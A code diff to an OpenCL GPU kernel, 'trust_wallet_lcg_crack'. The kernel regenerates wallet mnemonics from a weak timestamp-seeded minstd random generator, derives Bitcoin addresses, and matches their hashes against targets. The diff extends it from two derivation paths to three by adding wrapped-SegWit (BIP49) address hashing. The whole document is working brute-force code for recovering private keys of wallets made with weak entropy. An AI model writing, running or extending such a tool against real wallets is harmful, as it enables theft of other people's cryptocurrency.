@@ -6,30 +6,29 @@
 //
 // Seed normalisation (matches libstdc++ / libc++ behaviour):
 //   s = seed % M;  if (s == 0) s = 1;
-//   Without the % M: seed == M would make the first step output 0,
-//   and every subsequent step would stay at 0 (LCG deadlock).
 //
 // Two entropy strategies, both making 16 next_u32() calls for 16 bytes:
 //
 //   VariantAnd  (Python variant B / Trezor variant_b):
 //       entropy[i] = rng() & 0xFF   -->  byte in [0, 255]
-//       Matches: rng.next_u32() & 0xFF
 //
 //   VariantMod  (Python variant A / Trezor variant_a):
 //       entropy[i] = rng() % 0xFF   -->  byte in [0, 254]  (0xFF never produced!)
-//       Matches: rng.next_u32() % 0xFF   (0xFF == 255 in C)
 //
-// Two derivation paths:
-//   m/44'/0'/0'/0/0  P2PKH   (legacy 1...)
-//   m/84'/0'/0'/0/0  P2WPKH  (native SegWit bc1q...)
+// Three derivation paths:
+//   m/44'/0'/0'/0/0  P2PKH          (legacy 1...)
+//   m/84'/0'/0'/0/0  P2WPKH         (native SegWit bc1q...)
+//   m/49'/0'/0'/0/0  P2SH-P2WPKH   (wrapped SegWit 3...)
 //
-// Global work size = 4 x (end_ts - start_ts).
-//   gid -> timestamp = gid/4 + offset
-//          combo     = gid%4
+// Global work size = 6 x (end_ts - start_ts).
+//   gid -> timestamp = gid/6 + offset
+//          combo     = gid%6
 //   combo 0: VariantAnd + m/44'  (P2PKH)
 //   combo 1: VariantMod + m/44'  (P2PKH)
 //   combo 2: VariantAnd + m/84'  (P2WPKH)
 //   combo 3: VariantMod + m/84'  (P2WPKH)
+//   combo 4: VariantAnd + m/49'  (P2SH-P2WPKH)
+//   combo 5: VariantMod + m/49'  (P2SH-P2WPKH)
 //
 // Result: results[idx] = (ulong)timestamp | ((ulong)combo << 32)
 
@@ -42,7 +41,6 @@ static uint minstd_next(uint state) {
 
 // ---------------------------------------------------------------------------
 // Seed normalisation: s = seed % M; if (s == 0) s = 1
-// Fixes the deadlock when seed happens to equal M (2147483647).
 // ---------------------------------------------------------------------------
 static uint minstd_seed(uint seed) {
     uint s = seed % 2147483647u;
@@ -51,7 +49,7 @@ static uint minstd_seed(uint seed) {
 
 // ---------------------------------------------------------------------------
 // Strategy VariantAnd: 16 calls, entropy[i] = rng() & 0xFF
-// byte range [0, 255] — matches Python variant_b / Trezor variant_b
+// byte range [0, 255]
 // ---------------------------------------------------------------------------
 static void lcg_entropy_and(
     uint seed,
@@ -67,8 +65,6 @@ static void lcg_entropy_and(
 // ---------------------------------------------------------------------------
 // Strategy VariantMod: 16 calls, entropy[i] = rng() % 0xFF
 // byte range [0, 254] — 0xFF is NEVER produced
-// Matches Python variant_a / Trezor variant_a
-// Note: 0xFF == 255 in C, so this is modulo 255, not 256.
 // ---------------------------------------------------------------------------
 static void lcg_entropy_mod(
     uint seed,
@@ -94,11 +90,10 @@ __kernel void trust_wallet_lcg_crack(
     uint   range                // number of timestamps to check (bounds guard)
 ) {
     uint gid       = get_global_id(0);
-    uint combo     = gid & 3u;    // gid % 4
-    uint ts_offset = gid >> 2u;   // gid / 4
+    uint combo     = gid % 6u;
+    uint ts_offset = gid / 6u;
 
     // Bounds check: ghost work-items from alignment padding must be skipped
-    // (saves a full BIP32 derivation per ghost item)
     if (ts_offset >= range) return;
 
     uint timestamp = ts_offset + offset;
@@ -113,8 +108,13 @@ __kernel void trust_wallet_lcg_crack(
     }
 
     // ---- Derivation path --------------------------------------------------
-    // combo bit 1: 0 = m/44' (P2PKH), 1 = m/84' (P2WPKH)
-    uint purpose = (combo < 2u) ? 44u : 84u;
+    // combo 0,1 -> m/44' (P2PKH)
+    // combo 2,3 -> m/84' (P2WPKH)
+    // combo 4,5 -> m/49' (P2SH-P2WPKH)
+    uint purpose;
+    if (combo < 2u)       purpose = 44u;
+    else if (combo < 4u)  purpose = 84u;
+    else                  purpose = 49u;
 
     // ---- BIP39: entropy -> mnemonic -> seed --------------------------------
     uchar seed[64];
@@ -145,7 +145,27 @@ __kernel void trust_wallet_lcg_crack(
     public_from_private(&k_addr, &pub);
 
     uchar hash160[20];
-    identifier_for_public_key(&pub, hash160);
+
+    if (combo >= 4u) {
+        // P2SH-P2WPKH (BIP49):
+        //   inner = HASH160(compressed_pubkey)
+        //   witness_script = OP_0 OP_DATA_20 inner   (22 bytes)
+        //   outer = HASH160(witness_script)  <-- this is what goes in the scriptPubKey
+        uchar inner_h160[20];
+        identifier_for_public_key(&pub, inner_h160);
+
+        uchar witness_script[22] __attribute__((aligned(4)));
+        witness_script[0] = 0x00;
+        witness_script[1] = 0x14;
+        for (int i = 0; i < 20; i++) witness_script[i + 2] = inner_h160[i];
+
+        uchar sha256_result[32] __attribute__((aligned(4)));
+        sha256((__private uint*)witness_script, 22, (__private uint*)sha256_result);
+        ripemd160(sha256_result, 32, (__private uchar*)hash160);
+    } else {
+        // P2PKH and P2WPKH both use plain HASH160(pubkey)
+        identifier_for_public_key(&pub, hash160);
+    }
 
     // ---- Pack and compare ------------------------------------------------
     ulong h1 = 0UL, h2 = 0UL;
